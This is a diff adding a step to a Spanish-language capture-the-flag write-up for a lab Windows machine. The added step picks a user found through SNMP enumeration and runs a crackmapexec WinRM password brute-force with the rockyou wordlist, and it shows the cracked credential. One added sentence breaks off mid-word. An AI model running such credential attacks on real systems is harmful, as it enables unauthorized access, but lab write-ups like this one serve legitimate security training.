@@ -234,10 +234,21 @@ Enunciado :
             iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"
 
 
-  - 
-          
+  - Obtenemos Credenciales de acceso.
 
-        
+    Tenemos un listado de usuarios validos de la maquina victima, de momento nos vamos a interesar por --- Jareth --- ya que no es un usuario default.
+
+    Intentamos con cr
+          
+        ┌──(root㉿kali)-[/home/…/Desktop/ctf/try_ctf/year_ofthe_owl]
+        └─# crackmapexec winrm 10.10.121.136 -u jareth -p /usr/share/wordlists/rockyou.txt 
+        SMB         10.10.121.136   5985   YEAR-OF-THE-OWL  [*] Windows 10.0 Build 17763 (name:YEAR-OF-THE-OWL) (domain:year-of-the-owl)
+        HTTP        10.10.121.136   5985   YEAR-OF-THE-OWL  [*] http://10.10.121.136:5985/wsman
+        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [-] year-of-the-owl\jareth:123456
+        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [-] year-of-the-owl\jareth:12345
+        [.......]
+        [*] completed: 100.00% (1/1)                                                                                                           
+        WINRM       10.10.121.136   5985   YEAR-OF-THE-OWL  [+] year-of-the-owl\jareth:sarah (Pwn3d!)       
    
         
 
